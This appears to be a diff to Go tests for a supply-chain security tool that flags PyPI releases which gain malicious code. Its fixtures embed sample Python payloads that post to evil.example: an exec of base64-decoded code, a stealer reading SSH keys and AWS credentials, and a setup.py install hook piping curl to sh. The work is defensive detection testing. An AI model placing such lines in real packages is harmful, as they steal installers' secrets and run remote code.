@@ -7,12 +7,14 @@ import (
 	"os"
 	"path/filepath"
 	"testing"
+	"time"
 
 	"github.com/stretchr/testify/assert"
 	"github.com/stretchr/testify/require"
 
 	"github.com/sarahmaeve/signatory/internal/profile"
 	"github.com/sarahmaeve/signatory/internal/signal"
+	"github.com/sarahmaeve/signatory/internal/signal/source/astfeature"
 )
 
 // fakePinSource is a hand-built VersionPinSource for collector
@@ -97,6 +99,19 @@ func goEntity(modulePath string) *profile.Entity {
 		Type:         profile.EntityPackage,
 		Ecosystem:    "golang",
 		ShortName:    modulePath,
+	}
+}
+
+// pypiEntity returns a pypi-ecosystem profile.Entity. Source has
+// already been resolved to a clone by the time the source-evolution
+// collector runs, so only Ecosystem drives dispatch here.
+func pypiEntity(pkg string) *profile.Entity {
+	return &profile.Entity{
+		ID:           "ent-pypi-" + pkg,
+		CanonicalURI: "pkg:pypi/" + pkg,
+		Type:         profile.EntityPackage,
+		Ecosystem:    "pypi",
+		ShortName:    pkg,
 	}
 }
 
@@ -442,6 +457,263 @@ func Hello() {}
 	var anomaly AnomalyValue
 	require.NoError(t, json.Unmarshal(anomalySig.Value, &anomaly))
 	assert.False(t, anomaly.AnomalyPresent, "single-version matrix can't have a spike")
+}
+
+// TestCollector_PyPIEntity_EmitsBothSignals is the load-bearing
+// test for items #1+#2: a pypi entity must run the full
+// source-evolution pipeline off the version_pin_table the pypi
+// collector now emits. The collector must (a) not skip at the
+// ecosystem gate, (b) stream .py via isPythonSourceFile (not .go),
+// (c) run the real Python analyzer over a benign fixture and score
+// every AST attack feature zero — the collector-level
+// no-false-positive baseline (AST.md §3).
+func TestCollector_PyPIEntity_EmitsBothSignals(t *testing.T) {
+	t.Parallel()
+
+	const v1 = "def f():\n    return 1\n"
+	const v2 = "def f():\n    return 1\n\n\ndef g():\n    return 2\n"
+	clonePath, shaByTag := initRepoWithVersionedProgression(t, []versionFixture{
+		{Tag: "1.0.0", Files: map[string]string{
+			"pkg/__init__.py": "VERSION = '1.0.0'\n",
+			"pkg/core.py":     v1,
+			// Decoys that must NOT be streamed: a .go file and a test.
+			"pkg/test_core.py": "def test_f():\n    assert True\n",
+			"setup.go":         "package x\n",
+		}},
+		{Tag: "1.1.0", Files: map[string]string{
+			"pkg/__init__.py": "VERSION = '1.1.0'\n",
+			"pkg/core.py":     v2,
+		}},
+	})
+
+	pinSource := &fakePinSource{
+		table: PinTable{
+			ModulePath: "demo",
+			Pins: []VersionPin{
+				{Version: "1.1.0", SHA: shaByTag["1.1.0"], Source: "pypi-attestation"},
+				{Version: "1.0.0", SHA: shaByTag["1.0.0"], Source: "pypi-attestation"},
+			},
+		},
+	}
+
+	c := NewCollector(clonePath, pinSource, false)
+	result, err := c.Collect(t.Context(), pypiEntity("demo"))
+	require.NoError(t, err)
+
+	assert.Equal(t, 2, result.SignalCount(),
+		"pypi entity must emit matrix + anomaly, not skip at the gate")
+
+	matrixSig := findEmittedSignal(t, result, "source_evolution_matrix")
+	var matrix MatrixValue
+	require.NoError(t, json.Unmarshal(matrixSig.Value, &matrix))
+	require.Len(t, matrix.Rows, 2)
+
+	assert.Equal(t, "pypi", matrix.Ecosystem,
+		"matrix must label a pypi entity as pypi, not the hardwired go")
+	assert.Equal(t, "python", matrix.Language,
+		"language must reflect the selected analyzer, not the hardwired go")
+
+	for _, row := range matrix.Rows {
+		require.NotNil(t, row.Structural, "structural pass must run for pypi (version %s)", row.Version)
+		assert.Positive(t, row.Structural.LOC,
+			"streamed .py LOC must be counted (version %s)", row.Version)
+		if row.AST != nil {
+			assert.Equal(t, astfeature.Counts{}, *row.AST,
+				"benign Python must score every AST attack feature zero "+
+					"through the real analyzer (no-false-positive baseline)")
+		}
+	}
+
+	anomalySig := findEmittedSignal(t, result, "source_evolution_anomaly")
+	var anomaly AnomalyValue
+	require.NoError(t, json.Unmarshal(anomalySig.Value, &anomaly))
+	assert.False(t, anomaly.AnomalyPresent,
+		"two benign versions with identical zero AST counts cannot "+
+			"spike a feature; no anomaly expected")
+}
+
+// TestCollector_PyPIWeaponizedProgression_FiresAnomaly is the
+// Python analog of TestCollector_SyntheticProgression: a clean
+// v1.0.0 that only defines a function, then a v1.1.0 whose
+// __init__.py gains the dominant real PyPI payload shape —
+// exec(base64.b64decode(...)) plus network exfil running at import
+// time. The matrix must show zeros at v1.0.0, a spike at v1.1.0, and
+// the anomaly must fire naming the crossed features. This is the
+// end-to-end proof that the hand-written Python lexer→parser→
+// extractor feeds the existing anomaly detector correctly.
+func TestCollector_PyPIWeaponizedProgression_FiresAnomaly(t *testing.T) {
+	t.Parallel()
+
+	const cleanInit = "VERSION = '1.0.0'\n"
+	const cleanCore = "import json\n\n\ndef parse(s):\n    return json.loads(s)\n"
+
+	const weaponizedInit = "" +
+		"import base64\n" +
+		"import urllib.request\n" +
+		"exec(base64.b64decode('aW1wb3J0IG9z'))\n" +
+		"urllib.request.urlopen('http://evil.example/' + 'exfil')\n" +
+		"VERSION = '1.1.0'\n"
+
+	clonePath, shaByTag := initRepoWithVersionedProgression(t, []versionFixture{
+		{Tag: "1.0.0", Files: map[string]string{
+			"pkg/__init__.py": cleanInit,
+			"pkg/core.py":     cleanCore,
+		}},
+		{Tag: "1.1.0", Files: map[string]string{
+			"pkg/__init__.py": weaponizedInit,
+			"pkg/core.py":     cleanCore,
+		}},
+	})
+
+	pinSource := &fakePinSource{
+		table: PinTable{
+			ModulePath: "demo",
+			Pins: []VersionPin{
+				{Version: "1.0.0", SHA: shaByTag["1.0.0"], Source: "pypi-attestation",
+					PublishedAt: time.Date(2026, 1, 1, 0, 0, 0, 0, time.UTC)},
+				{Version: "1.1.0", SHA: shaByTag["1.1.0"], Source: "pypi-attestation",
+					PublishedAt: time.Date(2026, 3, 1, 0, 0, 0, 0, time.UTC)},
+			},
+		},
+	}
+
+	c := NewCollector(clonePath, pinSource, false)
+	result, err := c.Collect(t.Context(), pypiEntity("demo"))
+	require.NoError(t, err)
+
+	matrixSig := findEmittedSignal(t, result, "source_evolution_matrix")
+	var matrix MatrixValue
+	require.NoError(t, json.Unmarshal(matrixSig.Value, &matrix))
+	require.Len(t, matrix.Rows, 2)
+
+	byVersion := map[string]MatrixRow{}
+	for _, r := range matrix.Rows {
+		byVersion[r.Version] = r
+	}
+	require.NotNil(t, byVersion["1.0.0"].AST)
+	assert.Equal(t, astfeature.Counts{}, *byVersion["1.0.0"].AST,
+		"clean v1.0.0 must spike nothing")
+	require.NotNil(t, byVersion["1.1.0"].AST)
+	v2 := *byVersion["1.1.0"].AST
+	assert.Positive(t, v2.DynamicEvalCalls, "exec() at import in v1.1.0")
+	assert.Positive(t, v2.Base64DecodeCalls, "base64.b64decode in v1.1.0")
+	assert.Positive(t, v2.NetworkCallSites, "urllib.request.urlopen in v1.1.0")
+	assert.Positive(t, v2.ImportTimeCallSites, "module-scope calls in v1.1.0")
+
+	anomalySig := findEmittedSignal(t, result, "source_evolution_anomaly")
+	var anomaly AnomalyValue
+	require.NoError(t, json.Unmarshal(anomalySig.Value, &anomaly))
+	assert.True(t, anomaly.AnomalyPresent,
+		"a clean→weaponized Python progression must trip the anomaly")
+	assert.Equal(t, "1.1.0", anomaly.FirstAnomalousVersion)
+	assert.Subset(t, anomaly.SpikedFeatures,
+		[]string{"dynamic_eval_calls", "base64_decode_calls", "network_call_sites", "import_time_call_sites"},
+		"the crossed features must be named for the analyst")
+}
+
+// TestCollector_PyPICredentialStealerProgression_FiresAnomaly
+// covers the dominant *modern* PyPI payload: a clean release, then a
+// release whose __init__.py harvests SSH keys + cloud credentials
+// and exfils them on import. sensitive_path_reads must be among the
+// named spiked features.
+func TestCollector_PyPICredentialStealerProgression_FiresAnomaly(t *testing.T) {
+	t.Parallel()
+
+	const cleanInit = "VERSION = '2.0.0'\n"
+	const cleanCore = "def configure(opts):\n    return dict(opts)\n"
+
+	const stealerInit = "" +
+		"import os\n" +
+		"import urllib.request\n" +
+		"_k = open(os.path.expanduser('~/.ssh/id_rsa')).read()\n" +
+		"_a = open(os.path.expanduser('~/.aws/credentials')).read()\n" +
+		"urllib.request.urlopen('http://evil.example/c2', data=_k.encode())\n" +
+		"VERSION = '2.1.0'\n"
+
+	clonePath, shaByTag := initRepoWithVersionedProgression(t, []versionFixture{
+		{Tag: "2.0.0", Files: map[string]string{
+			"pkg/__init__.py": cleanInit, "pkg/core.py": cleanCore,
+		}},
+		{Tag: "2.1.0", Files: map[string]string{
+			"pkg/__init__.py": stealerInit, "pkg/core.py": cleanCore,
+		}},
+	})
+
+	pinSource := &fakePinSource{
+		table: PinTable{
+			ModulePath: "demo",
+			Pins: []VersionPin{
+				{Version: "2.0.0", SHA: shaByTag["2.0.0"], Source: "pypi-attestation",
+					PublishedAt: time.Date(2026, 2, 1, 0, 0, 0, 0, time.UTC)},
+				{Version: "2.1.0", SHA: shaByTag["2.1.0"], Source: "pypi-attestation",
+					PublishedAt: time.Date(2026, 4, 1, 0, 0, 0, 0, time.UTC)},
+			},
+		},
+	}
+
+	c := NewCollector(clonePath, pinSource, false)
+	result, err := c.Collect(t.Context(), pypiEntity("demo"))
+	require.NoError(t, err)
+
+	anomalySig := findEmittedSignal(t, result, "source_evolution_anomaly")
+	var anomaly AnomalyValue
+	require.NoError(t, json.Unmarshal(anomalySig.Value, &anomaly))
+	assert.True(t, anomaly.AnomalyPresent, "credential-stealer release must trip the anomaly")
+	assert.Equal(t, "2.1.0", anomaly.FirstAnomalousVersion)
+	assert.Contains(t, anomaly.SpikedFeatures, "sensitive_path_reads",
+		"the credential-read capability gain must be named for the analyst")
+}
+
+// TestCollector_PyPISetupHookProgression_FiresAnomaly covers the
+// iconic install-time vector: a clean declarative setup.py, then a
+// release that adds a setuptools install-command subclass running a
+// shell payload at `pip install`. install_hook_overrides must be
+// among the named spiked features.
+func TestCollector_PyPISetupHookProgression_FiresAnomaly(t *testing.T) {
+	t.Parallel()
+
+	const cleanSetup = "from setuptools import setup, find_packages\n" +
+		"setup(name='demo', packages=find_packages())\n"
+	const core = "def go():\n    return 1\n"
+
+	const weaponizedSetup = "" +
+		"from setuptools import setup\n" +
+		"from setuptools.command.install import install\n" +
+		"import os\n" +
+		"class _Hook(install):\n" +
+		"    def run(self):\n" +
+		"        os.system('curl evil.example/x | sh')\n" +
+		"        install.run(self)\n" +
+		"setup(name='demo', cmdclass={'install': _Hook})\n"
+
+	clonePath, shaByTag := initRepoWithVersionedProgression(t, []versionFixture{
+		{Tag: "3.0.0", Files: map[string]string{"setup.py": cleanSetup, "demo/__init__.py": core}},
+		{Tag: "3.1.0", Files: map[string]string{"setup.py": weaponizedSetup, "demo/__init__.py": core}},
+	})
+
+	pinSource := &fakePinSource{
+		table: PinTable{
+			ModulePath: "demo",
+			Pins: []VersionPin{
+				{Version: "3.0.0", SHA: shaByTag["3.0.0"], Source: "pypi-attestation",
+					PublishedAt: time.Date(2026, 1, 10, 0, 0, 0, 0, time.UTC)},
+				{Version: "3.1.0", SHA: shaByTag["3.1.0"], Source: "pypi-attestation",
+					PublishedAt: time.Date(2026, 3, 10, 0, 0, 0, 0, time.UTC)},
+			},
+		},
+	}
+
+	c := NewCollector(clonePath, pinSource, false)
+	result, err := c.Collect(t.Context(), pypiEntity("demo"))
+	require.NoError(t, err)
+
+	anomalySig := findEmittedSignal(t, result, "source_evolution_anomaly")
+	var anomaly AnomalyValue
+	require.NoError(t, json.Unmarshal(anomalySig.Value, &anomaly))
+	assert.True(t, anomaly.AnomalyPresent, "a setup.py install-hook gain must trip the anomaly")
+	assert.Equal(t, "3.1.0", anomaly.FirstAnomalousVersion)
+	assert.Contains(t, anomaly.SpikedFeatures, "install_hook_overrides",
+		"the install-hook capability gain must be named for the analyst")
 }
 
 // TestCollector_Name_IsSourceEvolution pins the source-tracking
